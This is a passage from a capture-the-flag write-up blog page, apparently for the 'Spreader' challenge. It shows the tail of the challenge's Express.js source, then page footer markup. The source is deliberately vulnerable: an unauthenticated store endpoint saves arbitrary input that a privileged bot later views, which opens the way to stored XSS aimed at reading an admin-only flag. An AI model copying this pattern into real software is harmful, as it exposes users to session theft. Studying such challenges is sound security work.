&#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/report_privileged&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="title function_">triggerXSS</span>(<span class="string">&quot;privileged&quot;</span>,<span class="title class_">PrivilegedPassWord</span>);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Privileged Bot successfully logged in.`</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error Reporting:&#x27;</span>, error);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Privileged Bot successfully logged in.`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/store&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(store);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/store&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">body</span>) &#123;</span><br><span class="line">            store.<span class="title function_">push</span>(req.<span class="property">body</span>);</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&#x27;Data stored successfully&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;No data received&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span> &amp;&amp; req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">role</span> === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">                fs.<span class="title function_">readFile</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error reading flag file:&#x27;</span>, err);</span><br><span class="line">                        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Internal Server Error&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="string">`Your Flag Here: <span class="subst">$&#123;data&#125;</span>`</span>);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Unauthorized!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error fetching flag:&#x27;</span>, error);</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Internal Server Error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> router;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%8E%E5%B0%9D%E8%AF%95-ALMOST-DONE"><span class="toc-number">1.</span> <span class="toc-text">分析与尝试(ALMOST DONE)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-and-payload"><span class="toc-number">2.</span> <span class="toc-text">***bypass and payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">源码</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/&text=Spreader_强网拟态24"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/&title=Spreader_强网拟态24"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/&is_video=false&description=Spreader_强网拟态24"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Spreader_强网拟态24&body=Check out this article: https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/&title=Spreader_强网拟态24"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/&title=Spreader_强网拟态24"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/&title=Spreader_强网拟态24"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/&title=Spreader_强网拟态24"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/&name=Spreader_强网拟态24&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/&t=Spreader_强网拟态24"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    KC1zs4&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+
+    var $inputArea = $("input#search-input");
+    var $resultArea = document.querySelector("div#search-result");
+
+    $inputArea.focus(function() {
+      var search_path = "search.xml";
+      if (search_path.length == 0) {
+        search_path = "search.xml";
+      }
+      var path = "/" + search_path;
+      searchFunc(path, 'search-input', 'search-result');
+    });
+
+    $inputArea.keydown(function(e) {
+      if (e.which == 13) {
+        e.preventDefault();
+      }
+    });
+
+    var observer = new MutationObserver(function(mutationsList, observer) {
+      if (mutationsList.length == 1) {
+        if (mutationsList[0].addedNodes.length) {
+          $(".search-no-result").hide();
+        } else if (mutationsList[0].removedNodes.length) {
+          $(".search-no-result").show(200);
+        }
+      }
+    });
+
+    observer.observe($resultArea, { childList: true });
+
+  });
+  </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
